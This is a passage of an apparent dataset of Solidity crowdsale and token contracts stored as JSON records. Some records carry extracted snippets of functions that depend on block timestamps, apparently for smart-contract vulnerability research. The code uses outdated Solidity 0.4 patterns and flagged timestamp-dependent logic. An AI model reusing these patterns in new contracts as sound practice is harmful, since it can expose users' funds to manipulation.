msg.sender;\n }\n function changeServiceAccount(address _account) onlyService public {\n assert(_account != 0);\n serviceAccount = _account;\n }\n function isServiceAccount() view public returns (bool) {\n return msg.sender == serviceAccount;\n }\n function check() onlyService notTriggered payable public {\n if (internalCheck()) {\n emit Triggered(this.balance);\n triggered = true;\n internalAction();\n }\n }\n function internalCheck() internal returns (bool);\n function internalAction() internal;\n modifier onlyService {\n require(msg.sender == serviceAccount);\n _;\n }\n modifier notTriggered() {\n require(!triggered);\n _;\n }\n}\ncontract BonusableCrowdsale is Consts, Crowdsale {\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != address(0));\n require(validPurchase());\n uint256 weiAmount = msg.value;\n uint256 bonusRate = getBonusRate(weiAmount);\n uint256 tokens = weiAmount.mul(bonusRate).div(1 ether);\n weiRaised = weiRaised.add(weiAmount);\n token.mint(beneficiary, tokens);\n emit TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function getBonusRate(uint256 weiAmount) internal view returns (uint256) {\n uint256 bonusRate = rate;\n uint[4] memory weiRaisedStartsBoundaries = [uint(0),uint(0),uint(0),uint(0)];\n uint[4] memory weiRaisedEndsBoundaries = [uint(20000000000000000000000),uint(20000000000000000000000),uint(20000000000000000000000),uint(20000000000000000000000)];\n uint64[4] memory timeStartsBoundaries = [uint64(1531692000),uint64(1532987940),uint64(1534802340),uint64(1536616740)];\n uint64[4] memory timeEndsBoundaries = [uint64(1532987940),uint64(1534802340),uint64(1536616740),uint64(1537826340)];\n uint[4] memory weiRaisedAndTimeRates = [uint(400),uint(300),uint(200),uint(100)];\n for (uint i = 0; i < 4; i++) {\n bool weiRaisedInBound = (weiRaisedStartsBoundaries[i] <= weiRaised) && (weiRaised < weiRaisedEndsBoundaries[i]);\n bool timeInBound = (timeStartsBoundaries[i] <= now) && (now < timeEndsBoundaries[i]);\n if (weiRaisedInBound && timeInBound) {\n bonusRate += bonusRate * weiRaisedAndTimeRates[i] / 1000;\n }\n }\n uint[2] memory weiAmountBoundaries = [uint(20000000000000000000),uint(10000000000000000000)];\n uint[2] memory weiAmountRates = [uint(0),uint(50)];\n for (uint j = 0; j < 2; j++) {\n if (weiAmount >= weiAmountBoundaries[j]) {\n bonusRate += bonusRate * weiAmountRates[j] / 1000;\n break;\n }\n }\n return bonusRate;\n }\n}\ncontract TemplateCrowdsale is Consts, MainCrowdsale\n , BonusableCrowdsale\n , RefundableCrowdsale\n , CappedCrowdsale\n{\n event Initialized();\n event TimesChanged(uint startTime, uint endTime, uint oldStartTime, uint oldEndTime);\n bool public initialized = false;\n function TemplateCrowdsale(MintableToken _token) public\n Crowdsale(START_TIME > now ? START_TIME : now, 1546297140, 1500 * TOKEN_DECIMAL_MULTIPLIER, 0x04B21fe3FBa3E8E548EfC51013E71242a55212cF)\n CappedCrowdsale(20000000000000000000000)\n RefundableCrowdsale(1000000000000000000000)\n {\n token = _token;\n }\n function init() public onlyOwner {\n require(!initialized);\n initialized = true;\n if (PAUSED) {\n MainToken(token).pause();\n }\n address[4] memory addresses = [address(0xdadc35adc3091329a2a593a6c2ba2f1539aae965),address(0xe99d4d19b23bfe83916b346814ee06043154ae78),address(0xaae82f543abb3abda4faacb887e2f802d48ed2da),address(0xaf2bde98fe39733b0f2a89053a3060c0bf8f77da)];\n uint[4] memory amounts = [uint(1500000000000000000000000),uint(5000000000000000000000000),uint(10000000000000000000000000),uint(3500000000000000000000000)];\n uint64[4] memory freezes = [uint64(1577746805),uint64(1577746805),uint64(0),uint64(0)];\n for (uint i = 0; i < addresses.length; i++) {\n if (freezes[i] == 0) {\n MainToken(token).mint(addresses[i], amounts[i]);\n } else {\n MainToken(token).mintAndFreeze(addresses[i], amounts[i], freezes[i]);\n }\n }\n transferOwnership(TARGET_USER);\n emit Initialized();\n }\n function createTokenContract() internal returns (MintableToken) {\n return MintableToken(0);\n }\n function setEndTime(uint _endTime) public onlyOwner {\n require(now < endTime);\n require(now < _endTime);\n require(_endTime > startTime);\n emit TimesChanged(startTime, _endTime, startTime, endTime);\n endTime = _endTime;\n }\n}",
  "extract_feature": [
    "function releaseOnce() public {\nbytes32 headKey = toKey(msg.sender, 0);\nuint64 head = chains[headKey];\nrequire(head != 0);\nrequire(uint64(block.timestamp) > head);\nbytes32 currentKey = toKey(msg.sender, head);\nuint64 next = chains[currentKey];\nuint amount = freezings[currentKey];\ndelete freezings[currentKey];\nbalances[msg.sender] = balances[msg.sender].add(amount);\nfreezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\nif (next == 0) {\ndelete chains[headKey];\n}\nelse {\nchains[headKey] = next;\ndelete chains[currentKey];\n}\nemit Released(msg.sender, amount);\n}",
    "function releaseAll() public returns (uint tokens) {\nuint release;\nuint balance;\n(release, balance) = getFreezing(msg.sender, 0);\nwhile (release != 0 && block.timestamp > release) {\nreleaseOnce();\ntokens += balance;\n(release, balance) = getFreezing(msg.sender, 0);\n}\n}",
    "function freeze(address _to, uint64 _until) internal {\nrequire(_until > block.timestamp);\nbytes32 key = toKey(_to, _until);\nbytes32 parentKey = toKey(_to, uint64(0));\nuint64 next = chains[parentKey];\nif (next == 0) {\nchains[parentKey] = _until;\nreturn;\n}\nbytes32 nextKey = toKey(_to, next);\nuint parent;\nwhile (next != 0 && _until > next) {\nparent = next;\nparentKey = nextKey;\nnext = chains[nextKey];\nnextKey = toKey(_to, next);\n}\nif (_until == next) {\nreturn;\n}\nif (next != 0) {\nchains[key] = next;\n}\nchains[parentKey] = _until;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f65"
  },
  "filename": "8596.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if 